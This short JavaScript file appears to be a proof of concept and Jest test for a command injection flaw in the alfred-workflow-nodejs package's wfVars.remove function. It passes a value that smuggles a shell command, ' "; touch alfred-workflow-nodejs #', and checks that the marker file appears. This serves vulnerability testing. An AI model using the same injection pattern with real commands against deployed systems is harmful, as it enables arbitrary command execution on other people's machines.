const AlfredNode = require("alfred-workflow-nodejs");
var utils = AlfredNode.utils;
utils.wfVars.remove(' "; touch alfred-workflow-nodejs #', function () {});


// test("Command Injection in killing", (done) => {
//   expect.assertions(2);
//   const AlfredNode = require("alfred-workflow-nodejs");
//   const fs = require("fs");
//   const path = "./alfred-workflow-nodejs";
//   try {
//     if (fs.existsSync(path)) {
//       fs.unlinkSync(path);
//       console.log("File removed:", path);
//     }
//   } catch (err) {
//     console.error(err);
//   }
//   file_exist = fs.existsSync(path);
//   expect(file_exist).toBe(false);
//   var utils = AlfredNode.utils;
//   utils.wfVars.remove(' "; touch alfred-workflow-nodejs #', function () {
//     file_exist = fs.existsSync(path);
//     expect(file_exist).toBe(true);
//     fs.unlink(path, function (err) {
//       done();
//     });
//   });
// });
